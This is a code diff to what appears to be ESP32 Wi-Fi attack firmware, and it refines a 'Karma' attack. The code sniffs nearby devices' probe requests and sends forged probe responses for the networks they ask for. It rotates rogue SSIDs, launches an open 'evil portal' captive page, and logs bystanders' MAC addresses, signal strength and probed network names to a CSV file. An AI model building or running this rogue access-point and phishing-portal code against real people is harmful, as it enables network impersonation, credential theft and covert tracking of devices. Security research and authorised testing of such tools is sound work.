@@ -25,6 +25,7 @@
 #include "esp_wifi.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/event_groups.h"
+#include "freertos/queue.h"
 #include "freertos/semphr.h"
 #include "lwip/etharp.h"
 #include "lwip/netif.h"
@@ -48,6 +49,7 @@
 #include <fcntl.h>
 #include <math.h>
 #include <mdns.h>
+#include <stdatomic.h>
 #include <stdio.h>
 #include <string.h>
 #include <sys/time.h>
@@ -4676,6 +4678,65 @@ static uint32_t last_ssid_change_time = 0;
 static bool karma_ssid_manual_mode = false;
 static char karma_portal_file[256] = "default"; // non-zero initializer: must stay in .data, not PSRAM .bss
 
+#define KARMA_EVENT_QUEUE_LENGTH 32
+
+typedef struct {
+    uint64_t uptime_ms;
+    uint8_t station_mac[6];
+    uint8_t channel;
+    int8_t rssi;
+    esp_err_t response_result;
+    char ssid[33];
+} karma_event_t;
+
+static QueueHandle_t karma_event_queue = NULL;
+static scan_file_t karma_scan_file = SCAN_FILE_INIT;
+static atomic_uint karma_received_count = 0;
+static atomic_uint karma_response_count = 0;
+static atomic_uint karma_dropped_count = 0;
+
+static void karma_make_printable_ssid(char output[33], const uint8_t *ssid, size_t length) {
+    size_t safe_length = length > 32 ? 32 : length;
+    for (size_t i = 0; i < safe_length; ++i) {
+        uint8_t value = ssid[i];
+        output[i] = (value >= 0x20 && value <= 0x7e) ? (char)value : '.';
+    }
+    output[safe_length] = '\0';
+}
+
+static void karma_csv_escape_ssid(const char *ssid, char output[67]) {
+    size_t write_index = 0;
+    for (size_t read_index = 0; ssid[read_index] != '\0' && write_index < 64; ++read_index) {
+        if (ssid[read_index] == '"' && write_index < 63) {
+            output[write_index++] = '"';
+        }
+        output[write_index++] = ssid[read_index];
+    }
+    output[write_index] = '\0';
+}
+
+static void karma_log_queued_events(void) {
+    if (karma_event_queue == NULL) return;
+
+    karma_event_t event;
+    while (xQueueReceive(karma_event_queue, &event, 0) == pdTRUE) {
+        if (!scan_file_is_open(&karma_scan_file)) continue;
+
+        char escaped_ssid[67];
+        karma_csv_escape_ssid(event.ssid, escaped_ssid);
+        scan_file_printf(&karma_scan_file,
+                         "%" PRIu64 ",%02X:%02X:%02X:%02X:%02X:%02X,%u,%d,\"%s\",%s\n",
+                         event.uptime_ms,
+                         event.station_mac[0], event.station_mac[1], event.station_mac[2],
+                         event.station_mac[3], event.station_mac[4], event.station_mac[5],
+                         (unsigned)event.channel, (int)event.rssi, escaped_ssid,
+                         event.response_result == ESP_OK ? "sent" : esp_err_to_name(event.response_result));
+    }
+}
+
+static esp_err_t karma_enable_probe_capture(void);
+static void karma_disable_probe_capture(void);
+
 
 // Helper to add SSID to cache if not present
 static void karma_add_ssid(const char *ssid) {
@@ -4718,7 +4779,7 @@ void wifi_manager_set_karma_portal_file(const char *path) {
 }
 
 // Helper function to send a probe response to a station
-static void karma_send_probe_response(const uint8_t *sta_mac, const char *ssid) {
+static esp_err_t karma_send_probe_response(const uint8_t *sta_mac, const char *ssid) {
     uint8_t resp[128] = {0};
     int idx = 0;
     // Frame Control: Probe Response (0x50 0x00)
@@ -4770,23 +4831,32 @@ static void karma_send_probe_response(const uint8_t *sta_mac, const char *ssid) 
         TERMINAL_VIEW_ADD_TEXT("[KARMA] Failed to send probe response to STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s': %s\n",
             sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5], ssid, esp_err_to_name(err));
     }
+    return err;
 }
 
 static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
-    if (type != WIFI_PKT_MGMT) return;
+    if (!karma_running || buf == NULL || type != WIFI_PKT_MGMT) return;
     const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    size_t frame_length = pkt->rx_ctrl.sig_len;
+    if (frame_length < sizeof(wifi_ieee80211_hdr_t) + 2) return;
+
     const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
     const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;
     uint8_t subtype = (hdr->frame_ctrl & 0xF0) >> 4;
     if (subtype != 4) return;
+
     const uint8_t *payload = ipkt->payload;
-    int ssid_offset = 0;
-    while (ssid_offset < pkt->rx_ctrl.sig_len - 24) {
+    size_t payload_length = frame_length - sizeof(wifi_ieee80211_hdr_t);
+    size_t ssid_offset = 0;
+    while (ssid_offset + 2 <= payload_length) {
+        uint8_t element_length = payload[ssid_offset + 1];
+        if (ssid_offset + 2 + element_length > payload_length) break;
+
         if (payload[ssid_offset] == 0x00) { // SSID IE
-            uint8_t ssid_len = payload[ssid_offset + 1];
+            uint8_t ssid_len = element_length;
             if (ssid_len > 0 && ssid_len < 33) {
                 char probed_ssid[33] = {0};
-                memcpy(probed_ssid, &payload[ssid_offset + 2], ssid_len);
+                karma_make_printable_ssid(probed_ssid, &payload[ssid_offset + 2], ssid_len);
                 if (!karma_ssid_manual_mode) {
                     karma_add_ssid(probed_ssid);
                 }
@@ -4795,22 +4865,46 @@ static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t 
                 TERMINAL_VIEW_ADD_TEXT("[KARMA] Received probe request from STA %02X:%02X:%02X:%02X:%02X:%02X for SSID '%s'\n",
                     hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], probed_ssid);
                 // Respond directly to probe request
-                karma_send_probe_response(hdr->addr2, probed_ssid);
+                esp_err_t response_result = karma_send_probe_response(hdr->addr2, probed_ssid);
+                atomic_fetch_add(&karma_received_count, 1);
+                if (response_result == ESP_OK) atomic_fetch_add(&karma_response_count, 1);
+
+                karma_event_t event = {
+                    .uptime_ms = (uint64_t)(esp_timer_get_time() / 1000),
+                    .channel = pkt->rx_ctrl.channel,
+                    .rssi = pkt->rx_ctrl.rssi,
+                    .response_result = response_result,
+                };
+                memcpy(event.station_mac, hdr->addr2, sizeof(event.station_mac));
+                strlcpy(event.ssid, probed_ssid, sizeof(event.ssid));
+                if (karma_event_queue == NULL ||
+                    xQueueSend(karma_event_queue, &event, 0) != pdTRUE) {
+                    atomic_fetch_add(&karma_dropped_count, 1);
+                }
             }
             break;
         }
-        ssid_offset += payload[ssid_offset + 1] + 2;
+        ssid_offset += (size_t)element_length + 2;
     }
 }
 
-static void karma_start_portal_for_ssid(const char *ssid) {
+static bool karma_start_portal_for_ssid(const char *ssid) {
     // Use the configured portal file (default or custom from SD), SSID as AP name, open AP
     if (!karma_portal_active) {
-        wifi_manager_start_evil_portal(karma_portal_file, ssid, "", ssid, "portal.local");
+        esp_err_t err = wifi_manager_start_evil_portal(karma_portal_file, ssid, "", ssid, "portal.local");
+        if (err != ESP_OK) {
+            printf("[KARMA] Failed to start Evil Portal for SSID '%s': %s\n",
+                   ssid, esp_err_to_name(err));
+            TERMINAL_VIEW_ADD_TEXT("[KARMA] Portal start failed for '%s': %s\n",
+                                   ssid, esp_err_to_name(err));
+            return false;
+        }
         karma_portal_active = true;
         printf("[KARMA] Evil portal started for SSID: %s\n", ssid);
         TERMINAL_VIEW_ADD_TEXT("[KARMA] Evil portal started for SSID: %s\n", ssid);
+        return true;
     }
+    return false;
 }
 
 static void karma_stop_portal_if_active(void) {
@@ -4822,53 +4916,61 @@ static void karma_stop_portal_if_active(void) {
     }
 }
 
+static esp_err_t karma_enable_probe_capture(void) {
+    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
+    esp_err_t err = esp_wifi_set_promiscuous_filter(&filter);
+    if (err == ESP_OK) err = esp_wifi_set_promiscuous_rx_cb(karma_probe_request_callback);
+    if (err == ESP_OK) err = esp_wifi_set_promiscuous(true);
+    if (err != ESP_OK) {
+        printf("Karma: failed to enable probe capture: %s\n", esp_err_to_name(err));
+        TERMINAL_VIEW_ADD_TEXT("Karma probe capture failed: %s\n", esp_err_to_name(err));
+    }
+    return err;
+}
+
+static void karma_disable_probe_capture(void) {
+    esp_err_t callback_err = esp_wifi_set_promiscuous_rx_cb(NULL);
+    esp_err_t promiscuous_err = esp_wifi_set_promiscuous(false);
+    if (callback_err != ESP_OK && callback_err != ESP_ERR_WIFI_NOT_INIT) {
+        ESP_LOGW(TAG, "Karma: failed to clear probe callback: %s", esp_err_to_name(callback_err));
+    }
+    if (promiscuous_err != ESP_OK && promiscuous_err != ESP_ERR_WIFI_NOT_INIT) {
+        ESP_LOGW(TAG, "Karma: failed to disable probe capture: %s", esp_err_to_name(promiscuous_err));
+    }
+}
+
 static void karma_task(void *param) {
+    (void)param;
     printf("Karma attack started\n");
     TERMINAL_VIEW_ADD_TEXT("Karma attack started\n");
 
-    // Enable promiscuous mode for capturing probe requests
-    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
-    esp_err_t err = esp_wifi_set_promiscuous_filter(&filter);
-    if (err != ESP_OK) {
-        printf("Karma: failed to set promiscuous filter: %s\n", esp_err_to_name(err));
+    esp_err_t log_err = scan_file_open(&karma_scan_file, "karma", "csv");
+    if (log_err == ESP_OK) {
+        scan_file_printf(&karma_scan_file,
+                         "uptime_ms,station_mac,channel,rssi,ssid,response\n");
+        printf("Karma event log: %s\n", karma_scan_file.path);
+        TERMINAL_VIEW_ADD_TEXT("Karma event log: %s\n", karma_scan_file.path);
+    } else {
+        printf("Karma event log unavailable: %s (enable Auto Save Scans and connect storage)\n",
+               esp_err_to_name(log_err));
+        TERMINAL_VIEW_ADD_TEXT("Karma log unavailable: enable Auto Save Scans and connect storage\n");
     }
-    err = esp_wifi_set_promiscuous(true);
-    if (err != ESP_OK) {
-        printf("Karma: failed to enable promiscuous mode: %s\n", esp_err_to_name(err));
-    }
-    esp_wifi_set_promiscuous_rx_cb(karma_probe_request_callback);
 
     last_ssid_change_time = esp_timer_get_time() / 1000;
 
     printf("Karma: entering loop, ssid_count=%d, ap_sta_has_ip=%d\n", karma_ssid_count, ap_sta_has_ip);
     fflush(stdout);
 
-    // If only one SSID, set it once and don't rotate
+    // Portal startup restarts Wi-Fi, so configure it before enabling probe capture.
     if (karma_ssid_count == 1) {
-        wifi_config_t ap_config = {
-            .ap = {
-                .ssid = "",
-                .ssid_len = strlen(karma_ssid_cache[0]),
-                .channel = 1,
-                .authmode = WIFI_AUTH_OPEN,
-                .max_connection = 4,
-                .ssid_hidden = 0
-            }
-        };
-        strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[0], 32);
-        err = esp_wifi_set_mode(WIFI_MODE_AP);
-        if (err != ESP_OK) printf("Karma: set_mode failed: %s\n", esp_err_to_name(err));
-        err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-        if (err != ESP_OK) printf("Karma: set_config failed: %s\n", esp_err_to_name(err));
-        err = esp_wifi_start();
-        if (err != ESP_OK) printf("Karma: start failed: %s\n", esp_err_to_name(err));
         printf("Karma using single SSID: %s\n", karma_ssid_cache[0]);
         TERMINAL_VIEW_ADD_TEXT("Karma using single SSID: %s\n", karma_ssid_cache[0]);
         karma_start_portal_for_ssid(karma_ssid_cache[0]);
     }
+    karma_enable_probe_capture();
 
     while (karma_running) {
-        printf("Karma: loop start, ssid_count=%d, ap_sta_has_ip=%d\n", karma_ssid_count, ap_sta_has_ip);
+        karma_log_queued_events();
         uint32_t now = esp_timer_get_time() / 1000;
         // Only rotate if more than one SSID
         if (!ap_sta_has_ip && karma_ssid_count > 1 && (now - last_ssid_change_time > 5000)) {
@@ -4883,11 +4985,14 @@ static void karma_task(void *param) {
                 }
             };
             strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[karma_ssid_index], 32);
-            err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+            esp_err_t err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
             if (err != ESP_OK) printf("Karma: set_config failed: %s\n", esp_err_to_name(err));
             printf("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
             TERMINAL_VIEW_ADD_TEXT("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
-            karma_start_portal_for_ssid(karma_ssid_cache[karma_ssid_index]);
+            if (karma_start_portal_for_ssid(karma_ssid_cache[karma_ssid_index])) {
+                // Starting the portal stops/restarts Wi-Fi and disables promiscuous mode.
+                karma_enable_probe_capture();
+            }
             karma_ssid_index = (karma_ssid_index + 1) % karma_ssid_count;
             last_ssid_change_time = now;
         }
@@ -4902,23 +5007,63 @@ static void karma_task(void *param) {
      
         vTaskDelay(pdMS_TO_TICKS(500));
     }
-    esp_wifi_set_promiscuous(false);
+
+    karma_disable_probe_capture();
+    karma_log_queued_events();
+
+    unsigned received = atomic_load(&karma_received_count);
+    unsigned responses = atomic_load(&karma_response_count);
+    unsigned dropped = atomic_load(&karma_dropped_count);
+    char saved_path[sizeof(karma_scan_file.path)] = {0};
+    if (scan_file_is_open(&karma_scan_file)) {
+        strlcpy(saved_path, karma_scan_file.path, sizeof(saved_path));
+        scan_file_printf(&karma_scan_file,
+                         "# summary,received=%u,responses=%u,dropped=%u\n",
+                         received, responses, dropped);
+        scan_file_close(&karma_scan_file);
+    }
+    if (karma_event_queue != NULL) {
+        vQueueDelete(karma_event_queue);
+        karma_event_queue = NULL;
+    }
+
     karma_stop_portal_if_active();
     karma_task_handle = NULL;
-    printf("Karma attack stopped\n");
-    TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
+    printf("Karma attack stopped (received=%u, responses=%u, dropped=%u)\n",
+           received, responses, dropped);
+    TERMINAL_VIEW_ADD_TEXT("Karma stopped: %u probes, %u responses, %u dropped\n",
+                           received, responses, dropped);
+    if (saved_path[0] != '\0') {
+        printf("Karma event log saved: %s\n", saved_path);
+        TERMINAL_VIEW_ADD_TEXT("Karma event log saved: %s\n", saved_path);
+    }
     vTaskDelete(NULL);
 }
 void wifi_manager_start_karma(void) {
-    if (karma_running) {
-        printf("Karma attack already running\n");
-        TERMINAL_VIEW_ADD_TEXT("Karma attack already running\n");
+    if (karma_running || karma_task_handle != NULL) {
+        printf("Karma attack already running or stopping\n");
+        TERMINAL_VIEW_ADD_TEXT("Karma attack already running or stopping\n");
         return;
     }
     if (!karma_ssid_manual_mode) {
         karma_ssid_count = 0;
         karma_ssid_index = 0;
     }
+
+    if (karma_event_queue != NULL) {
+        vQueueDelete(karma_event_queue);
+        karma_event_queue = NULL;
+    }
+    karma_event_queue = xQueueCreate(KARMA_EVENT_QUEUE_LENGTH, sizeof(karma_event_t));
+    if (karma_event_queue == NULL) {
+        printf("Failed to start Karma event logger: out of memory\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to start Karma event logger\n");
+        return;
+    }
+    atomic_store(&karma_received_count, 0);
+    atomic_store(&karma_response_count, 0);
+    atomic_store(&karma_dropped_count, 0);
+
     karma_running = true;
     BaseType_t rc = xTaskCreate(karma_task, "karma_task", 4096, NULL, 5, &karma_task_handle);
     if (rc != pdPASS) {
@@ -4926,6 +5071,8 @@ void wifi_manager_start_karma(void) {
         TERMINAL_VIEW_ADD_TEXT("Failed to start Karma task\n");
         karma_running = false;
         karma_task_handle = NULL;
+        vQueueDelete(karma_event_queue);
+        karma_event_queue = NULL;
         return;
     }
 }
@@ -4942,14 +5089,18 @@ void wifi_manager_stop_karma(void) {
     karma_ssid_manual_mode = false;
     strncpy(karma_portal_file, "default", sizeof(karma_portal_file));
     int wait_count = 0;
-    while (karma_task_handle != NULL && wait_count < 30) {
+    while (karma_task_handle != NULL && wait_count < 100) {
         vTaskDelay(pdMS_TO_TICKS(100));
         wait_count++;
     }
 
     if (karma_task_handle != NULL) {
-        vTaskDelete(karma_task_handle);
-        karma_task_handle = NULL;
+        // Do not force-delete the worker: it owns the probe callback, queue,
+        // event log, and portal cleanup. A later start remains gated on the
+        // task handle until that cleanup finishes.
+        printf("Karma cleanup is still in progress\n");
+        TERMINAL_VIEW_ADD_TEXT("Karma cleanup is still in progress\n");
+        return;
     }
     printf("Karma attack stopped\n");
     TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
